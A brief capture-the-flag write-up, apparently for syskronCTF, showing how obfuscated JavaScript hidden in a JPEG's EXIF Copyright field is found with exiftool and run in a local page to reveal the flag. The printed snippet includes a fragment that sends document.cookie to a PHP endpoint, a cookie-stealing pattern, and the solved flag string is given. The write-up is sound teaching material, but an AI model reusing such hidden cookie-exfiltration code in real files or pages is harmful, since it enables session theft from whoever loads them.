Download the picture.

Then `exiftool` give next result:

~~~
root@kali:~/Downloads# exiftool change.jpg
ExifTool Version Number         : 12.06
File Name                       : change.jpg
Directory                       : .
...
Copyright                       : var _0xb30f=['qep','0k5','app','ati','kro','fu5','tes','+(\x20','\x20+\x20','^([','LPa','uct','001','sys','Wor','s\x20+','+[^','\x20/\x22','7.0',')+)','ret','loc','\x20]+','ked','/12','htt','l1k','{l0','nCT','GyR','thi','log','3dj','\x20\x22/','LeT','Ryt','^\x20]','con','30b','str','c47'];
...
...
...
0'+_0x19ee('0x0')+'.ph'+'p?c'+'='+document['coo'+'kie'],console[_0x19ee('0x13')](_0x19ee('0x2')+_0x19ee('0xb')+'!'),console[_0x19ee('0x13')](_0x19ee('0x1')+_0x19ee('0x21')+_0x19ee('0x10')+'F'),console[_0x19ee('0x13')](_0x19ee('0xf')+_0x19ee('0x1e')+_0x19ee('0xe')+_0x19ee('0x1a')+_0x19ee('0x22')+_0x19ee('0x1c')+_0x19ee('0x14')+'5}');}abc();
...
Create Date                     : 2020:08:21 13:03:22.00
Date/Time Original              : 2020:08:21 13:03:22.00
Thumbnail Image                 : (Binary data 7707 bytes, use -b option to extract)
~~~

There is JS code. I put it in another file and tried to execute through html `<script src="code.js"></script>`. However, it didn't work and it just redirected me to another file like `localhost/0001.php?c=`. Then i created this empty file and in console i got the flag.

~~~
<html>
<script src="code.js"></script>
</html>
~~~

`systemctl start apache2`

Go to localhost/page.html. Next in console we can see the flag `Worked!syskronCTF{l00k5l1k30bfu5c473dj5}`.
